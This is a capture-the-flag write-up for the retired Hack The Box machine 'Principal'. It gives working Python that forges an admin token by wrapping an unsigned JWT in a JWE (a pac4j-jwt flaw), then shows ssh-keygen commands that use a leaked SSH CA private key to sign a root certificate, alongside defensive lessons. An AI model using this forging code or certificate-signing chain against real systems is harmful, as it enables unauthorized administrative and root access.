# Principal — Hack The Box (retired)

**Medium · Linux** · rooted in ~13 minutes from an IP alone.

```
JWE-wrapped unsigned JWT (CVE-2026-29000 pattern) → forged ROLE_ADMIN
  → admin API leaks an SSH password → svc-deploy
  → group-readable, unencrypted SSH CA private key → self-signed cert for root
```

---

## The shape of it

Two ports. A login page. And a header that tells you which library is checking
your token.

```
22/tcp   open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open  http  Jetty
                     X-Powered-By: pac4j-jwt/6.0.3
```

`X-Powered-By` naming a *security* library with a *precise version* is the most
useful thing a server can tell you. Everything that follows came from pulling that
thread — and the whole chain is three variations on one theme: a control that
exists, is correctly implemented, and is holding up the wrong part of the building.

## Reading the app before touching it

`/login` is a static page. `/static/js/app.js` is 10 KB of unminified client code
with a header comment that reads like internal design documentation:

```js
/**
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 */
```

Plus the endpoint map: `/api/dashboard`, `/api/users` (admin), `/api/settings`
(admin).

Two minutes of reading replaced an hour of fuzzing. Note what it hands over: the
exact claim names, the exact role strings, the issuer value, and the location of a
**public key you are invited to fetch**.

```json
{"keys":[{"kty":"RSA","e":"AQAB","kid":"enc-key-1","n":"lTh54vtBS1NAWrx..."}]}
```

That is the *encryption* key. RSA encryption uses the public half — so anyone can
build a token this server will successfully decrypt. Decryption is not
authentication, and the question is whether the app knows that.

## The CVE

`pac4j-jwt 6.0.3`. The version is pinned, so enumerate the CVE set rather than
guessing:

**CVE-2026-29000** — pac4j-jwt before 4.5.9 / 5.7.9 / **6.3.3**. Wrap an unsigned
`PlainJWT` (`alg: none`) inside a JWE. The library decrypts the envelope, finds
that the inner token is not a `SignedJWT`, and — because the resulting object is
`null` — skips signature verification entirely, then builds the profile from the
unverified claims. The only thing an attacker needs is the RSA public key, which
is published.

The precondition and the artifact matched exactly, so this was worth building.

## Forging the token

`jwcrypto` isn't in the container by default (`pip install jwcrypto`, one line into
`docker/packages.local.txt` afterwards). The PlainJWT has to be constructed by
hand — most libraries won't emit `alg: none` — but it is just three base64url
segments with an empty third:

```python
plain_jwt = b64(header) + "." + b64(claims) + "."      # note the trailing dot

protected = {"alg": "RSA-OAEP-256", "enc": "A128GCM", "cty": "JWT", "kid": "enc-key-1"}
token = jwe.JWE(plain_jwt.encode(), protected=json_encode(protected))
token.add_recipient(key)                                # key = the published public key
print(token.serialize(compact=True))
```

The claims are copied straight from the comment block in `app.js`:

```json
{"sub":"admin","role":"ROLE_ADMIN","iss":"principal-platform","iat":...,"exp":...}
```

```
GET /api/dashboard   Authorization: Bearer <forged>

HTTP/1.1 200 OK
{"user":{"role":"ROLE_ADMIN","username":"admin"}, "stats":{...}, ...}
```

Administrator, with no credential, about ninety seconds after reading the header.

Once I had root I read the server's own code, and the bug is the CVE pattern
reimplemented by hand rather than merely inherited from the library:

```java
SignedJWT signedJWT = jwt.serialize().contains(".") ? toSignedJWT(jwt) : null;
if (signedJWT != null) {
    if (!signedJWT.verify(verifier)) return null;
}
JWTClaimsSet claims = jwt.getJWTClaimsSet();   // trusted either way
```

`toSignedJWT()` returns `null` for a `PlainJWT`. So the signature check sits behind
a condition the attacker controls. The fix is one word of intent: require a
verified signature, don't merely *skip* verification when there isn't one.

## The admin API is the loot

`/api/users` gives eight accounts, and one of them explains the machine:

```json
{"username":"svc-deploy","role":"deployer",
 "note":"Service account for automated deployments via SSH certificate auth."}
```

`/api/settings` gives the rest of it:

```json
"security": { "encryptionKey": "D3pl0y_$$H_Now42!" },
"infrastructure": {
  "sshCaPath": "/opt/principal/ssh/",
  "sshCertAuth": "enabled",
  "notes": "SSH certificate auth configured for automation - see /opt/principal/ssh/ for CA config."
}
```

I fuzzed `/api/` for a deploy or certificate-issuing endpoint — with the admin
token, against `raft-medium-words` — and there is none. Only `users`, `settings`,
`dashboard`, `health`. The web app is not the route to the host; it is a
credential vending machine.

So: the field is called `encryptionKey`, but it reads `D3pl0y_$$H_Now42!` —
"deploy SSH now". Names on a lab box are a hypothesis, and this one is testable.

## One password, eight accounts

The rule is one password per account, never a list per account — a list is how you
lock accounts out or trip fail2ban and lose the source IP for everyone.

```
svc-deploy   uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
admin        Permission denied (publickey,password).
jthompson    Permission denied (publickey,password).
...
```

`user.txt`, and a group called **`deployers`**.

## The privilege inversion

What does `deployers` actually buy? Ask the filesystem rather than guessing:

```bash
find / -group deployers 2>/dev/null
/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh
/opt/principal/ssh/ca
```

Three paths, and they answer each other.

```
# /etc/ssh/sshd_config.d/60-principal.conf
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

```
-rw-r----- 1 root deployers 3381 /opt/principal/ssh/ca      <- the PRIVATE key
-rw-r--r-- 1 root root       742 /opt/principal/ssh/ca.pub
```

sshd trusts this CA for user authentication. The CA's private key is readable by
the group that the account I already hold belongs to. And the first line of the
key blob settles the last question:

```
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ...
```

Decoded: `openssh-key-v1\0` then `none`, `none` — cipher and KDF. **No passphrase.**
(The `D3pl0y_$$H_Now42!` string looked like it might be the CA passphrase; it
wasn't, and checking the blob's cipher field cost one line instead of a guess.)

Now the two missing constraints matter. There is **no `AuthorizedPrincipalsFile`**
and no principal restriction anywhere in the sshd config, so a certificate is
accepted for whatever principal it names. And `PermitRootLogin prohibit-password`
does not mean "no root" — it means "root, but by key or certificate". Which is
exactly what I can now issue:

```bash
ssh-keygen -t ed25519 -N "" -f rootcert_key
ssh-keygen -s ca -I pwnloop-deploy -n root,svc-deploy -V -5m:+2h rootcert_key.pub
```

```
Signed user key: id "pwnloop-deploy" for root,svc-deploy
        Principals: root, svc-deploy
```

```bash
ssh -i rootcert_key -o CertificateFile=rootcert_key-cert.pub root@target
uid=0(root) gid=0(root) groups=0(root)
```

`root.txt`.

(`-V -5m:+2h` backdates the start five minutes — a certificate whose validity
begins "now" is rejected if the target's clock is even slightly behind yours, and
that failure looks identical to the CA not being trusted.)

## What the box teaches

**`X-Powered-By` naming a security library with a version is the whole engagement.**
Not "a web server" — the component that decides whether you are authenticated. Pin
it and enumerate its CVEs before you touch a wordlist. Everything here descended
from one response header.

**Encryption is not authentication, and a published key is a public key.** The
design looked strong: RSA-OAEP-256 envelope, RS256 inner signature, JWKS for key
distribution. But the envelope is sealed with a key the server *hands out*, so
producing a decryptable token proves nothing. Whenever an app documents "we
encrypt the token", ask what it does when the thing inside the envelope isn't
signed. The general shape of the bug — a verification step guarded by
`if (parsed != null)` where the attacker chooses whether parsing succeeds — is not
specific to JWT, and it is worth grepping for in any validator.

**A secret's field name is a hypothesis, not a fact.** `security.encryptionKey`
containing `D3pl0y_$$H_Now42!` was an SSH password. Test recovered secrets against
every service and every account regardless of what the config called them — one
password per account, so a wrong guess costs a line of output rather than a locked
account or a banned source IP.

**Ask the filesystem what a group grants.** Landing in an unfamiliar group,
`find / -group <grp>` is one command and here it returned exactly three paths that
explained each other: the sshd config that trusts a CA, and the CA's own private
key. That is faster and more honest than reasoning about what a group *sounds*
like it should do.

**An SSH CA is root, so custody is the whole control.** Certificate authentication
is the right architecture — short-lived, revocable, attributable. It collapses the
moment the signing key is readable by the accounts that authenticate *with* it,
and it collapses completely when nothing constrains which principals a certificate
may claim. Two lines of sshd config (`AuthorizedPrincipalsFile`, and keeping the
key off the host) are the difference between a good design and a one-command root.

**The hardening that was there worked — it just wasn't guarding this.** The
application runs under `NoNewPrivileges`, `ProtectSystem=strict`, `ProtectHome`,
`PrivateTmp`, as an unprivileged user. Compromising the web app never yielded code
execution, and it never needed to: the chain ran entirely on data the API handed
over and on file permissions elsewhere. Runtime hardening does not help when the
application's own responses are the leak.

---

*Flags redacted. Machine confirmed retired before publication.*
